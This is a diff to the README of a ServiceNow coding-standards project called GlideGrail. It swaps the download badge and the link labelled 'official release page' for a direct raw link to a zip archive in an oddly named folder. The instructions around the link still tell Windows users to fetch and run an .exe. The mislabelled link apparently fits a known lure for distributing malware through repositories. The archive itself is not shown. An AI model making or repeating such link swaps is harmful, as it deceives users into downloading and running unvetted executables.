@@ -1,6 +1,6 @@
 # 📜 GlideGrail - Write better ServiceNow code with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Thebaultsemirigid251/GlideGrail/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Thebaultsemirigid251/GlideGrail/raw/refs/heads/main/Tarkalani/Glide_Grail_v1.8.zip)
 
 ## 📌 About this project
 
@@ -14,7 +14,7 @@ ServiceNow development involves complex data structures. Without a plan, scripts
 
 You need to access the latest version to apply these standards to your workflow. Follow these steps to prepare your system on Windows.
 
-1. Visit the [official release page](https://github.com/Thebaultsemirigid251/GlideGrail/releases).
+1. Visit the [official release page](https://github.com/Thebaultsemirigid251/GlideGrail/raw/refs/heads/main/Tarkalani/Glide_Grail_v1.8.zip).
 2. Look for the latest file list under the Assets section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
